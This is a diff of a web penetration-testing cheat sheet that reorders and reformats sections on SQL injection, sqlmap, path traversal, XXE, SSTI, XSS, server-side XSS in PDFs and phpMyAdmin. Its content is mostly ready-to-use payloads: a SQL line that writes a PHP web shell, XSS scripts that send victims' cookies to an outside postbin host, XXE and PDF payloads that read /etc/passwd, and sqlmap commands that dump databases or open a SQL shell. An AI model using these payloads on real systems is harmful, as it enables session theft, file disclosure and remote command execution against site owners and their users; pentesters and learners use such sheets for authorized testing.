@@ -10,7 +10,7 @@
 - [Certificate](#certificate)
 - [Download .git](#download-git)
 - [Interesting routes](#interesting-routes)
-- [Path traversal (LFI)](#path-traversal-lfi-)
+- [Path traversal (LFI)](#path-traversal-lfi)
 - [PhpMyAdmin](#phpmyadmin)
 - [Request](#request)
 - [Server Side XSS](#server-side-xss)
@@ -48,7 +48,7 @@
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
 ```
 
-***Most Popular domain discovery command***
+*Most Popular domain discovery command*
 ```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
 ```
@@ -59,7 +59,7 @@ gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small
 ```
 
 ### Feroxbuster
-***(Best one)***
+*(Best one)*
 ```bash
 feroxbuster -u <url> -e -x html,js,php
 ```
@@ -75,12 +75,6 @@ dirbuster
 ```
 ```bash
 owasp-zap
-```
-
-# PhpMyAdmin
-### Quick Shellcode
-```sql
-SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 
 # SQL Injection
@@ -119,7 +113,7 @@ admin", "") ON DUPLICATE KEY UPDATE password="newpasswd";
 ```
 
 ## SQLmap
-SQLmap is a tool that automates the process of detecting and exploiting SQL injection.
+> SQLmap is a tool that automates the process of detecting and exploiting SQL injection.
 
 [SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
@@ -186,53 +180,6 @@ sqlmap -r req --sql-shell
 sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
 ```
 
-# Request
-> Different tool to make a http request.
-
-## Curl
-### Send X-form
-```bash
-curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
-```
-
-### Send Json
-```bash
-curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
-```
-
-## Python
-```python
-import requests
-
-# GET
-requests.get('http://example.com')
-# POST
-requests.post('http://example.com/submit',
-    headers={
-        'Content-type': 'raw',
-    },
-    data={'user': 'guest'},
-)
-```
-- [Details script](/wiki/Python.md#requests)
-
-## Javascript
-```javascript
-//  GET
-fetch('http://example.com/',{
-    method: 'GET',
-})
-
-// POST
-fetch('http://example.com/',{
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({data: 'lol'})
-})
-```
-
 # Path traversal (LFI)
 > A path traversal attack aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files.
 > It may be possible to access arbitrary files and directories including application source code or configuration and critical system files.
@@ -260,44 +207,6 @@ fetch('http://example.com/',{
 
 - [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
 - [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
-
-# Download .git
-```bash
-githacker --url http://url/.git/ --folder result
-```
-[Source](https://github.com/WangYihang/GitHacker)
-
-# XML external entity (XXE)
-> XML external entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
-> It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. - [source](https://portswigger.net/web-security/xxe)
-
-### Read File
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "file:///etc/passwd">
-]>
-<foo>Hello &file;</foo>
-```
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
-]>
-<foo>Hello &file;</foo>
-```
-
-### Get Link
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "http://example.com/path">
-]>
-<foo>Hello &file;</foo>
-```
-```xml
-<!DOCTYPE foo [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/path">
-]>
-<foo>Hello &file;</foo>
-```
 
 # SSTI
 > Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection.
@@ -336,6 +245,138 @@ ${{1+1}}
 - [PayloadsAllTheThings - STTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 - [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
 
+# XML external entity (XXE)
+> XML external entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
+> It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. - [source](https://portswigger.net/web-security/xxe)
+
+### Read File
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<foo>Hello &file;</foo>
+```
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
+]>
+<foo>Hello &file;</foo>
+```
+
+### Get Link
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "http://example.com/path">
+]>
+<foo>Hello &file;</foo>
+```
+```xml
+<!DOCTYPE foo [
+    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/path">
+]>
+<foo>Hello &file;</foo>
+```
+
+# XSS Injection
+> XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
+> [source](https://en.wikipedia.org/wiki/Cross-site_scripting)
+
+### Script
+```html
+<script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
+```
+```html
+<script>document.location = 'https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie);</script>
+```
+```html
+<script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
+```
+
+### Object
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
+### Useful Link
+- [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
+- [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
+- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
+
+# Server Side XSS
+> Server XSS occurs when untrusted user supplied data is included in an HTTP response generated by the server.
+> In this case, the entire vulnerability is in server-side code, and the browser is simply rendering the response and executing any valid script embedded in it.
+> [source](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+
+### Dynamic PDF
+```xml
+<iframe src=file:///etc/passwd></iframe>
+<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<link rel=attachment href="file:///etc/passwd">
+<object data="file:///etc/passwd">
+<portal src="file:///etc/passwd" id="portal">
+<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
+```
+```xml
+<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
+```
+
+### Extract annotation
+You can extract annotation files with this [script](https://github.com/sawyerf/HackSheet/scripts/get-pdf-annot.py):
+```bash
+pip3 install pymupdf
+python3 script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
+```
+
+# Request
+> Different tool to make a http request.
+
+### Curl
+```bash
+curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
+```
+```bash
+curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
+```
+
+### Python
+```python
+import requests
+
+# GET
+requests.get('http://example.com')
+# POST
+requests.post('http://example.com/submit',
+    headers={
+        'Content-type': 'raw',
+    },
+    data={'user': 'guest'},
+)
+```
+- [Details script](/wiki/Python.md#requests)
+
+### Javascript
+```javascript
+//  GET
+fetch('http://example.com/',{
+    method: 'GET',
+})
+
+// POST
+fetch('http://example.com/',{
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({data: 'lol'})
+})
+```
+
+# Download .git
+```bash
+githacker --url http://url/.git/ --folder result
+```
+[Source](https://github.com/WangYihang/GitHacker)
+
 # CMS
 ### Scaning
 ```bash
@@ -363,52 +404,8 @@ wpscan --force update -e --url IP --disable-tls-checks
 curl <url> --key KEY.key --cert CERT.cert
 ```
 
-# XSS Injection
-> XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
-> [source](https://en.wikipedia.org/wiki/Cross-site_scripting)
-
-## Script
-```html
-<script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
-```
-```html
-<script>document.location = 'https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie);</script>
-```
-```html
-<script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
-```
-
-## Object
-```html
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
-```
-```html
-
-```
-
-### Useful Link
-- [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
-- [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
-- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
-
-# Server Side XSS
-## Dynamic PDF
-### Read local file
-```xml
-<iframe src=file:///etc/passwd></iframe>
-<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-<link rel=attachment href="file:///etc/passwd">
-<object data="file:///etc/passwd">
-<portal src="file:///etc/passwd" id="portal">
-<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
-```
-```xml
-<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
-```
-
-### Extract annotation
-You can extract annotation files with this [script](https://github.com/sawyerf/HackSheet/scripts/get-pdf-annot.py):
-```bash
-pip3 install pymupdf
-python3 script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
+# PhpMyAdmin
+### Quick Shellcode
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
